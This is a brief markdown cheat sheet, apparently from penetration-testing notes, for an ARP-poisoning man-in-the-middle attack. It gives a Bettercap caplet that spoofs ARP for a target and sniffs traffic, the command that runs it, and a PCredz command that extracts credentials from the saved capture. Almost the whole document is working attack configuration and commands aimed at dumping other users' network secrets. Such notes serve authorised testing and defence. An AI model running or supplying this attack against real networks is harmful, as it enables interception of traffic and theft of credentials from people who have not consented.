# ARP Poisoning

## Tools: Bettercap PCredz 

Link: https://github.com/lgandx/PCredz

## Use cases

### 1) Dump Network Secrets

#### Bettercap config file

##### quick recon of the network
    net.probe on

##### set the ARP poisoning
    set arp.spoof.targets <target_IP>
    set arp.spoof.internal true
    set arp.spoof.fullduplex true

##### control logging and verbosity
    events.ignore endpoint
    events.ignore net.sniff.mdns

##### start the modules
    arp.spoof on
    net.sniff on

### 2) Run bettercap

    sudo ./bettercap --iface <interface> --caplet spoof.cap

### 3) Then sniff with Wireshark. When it is finish, save the trace in a .pcap file and extract the secrets:

    python3 ./Pcredz -f extract.pcap
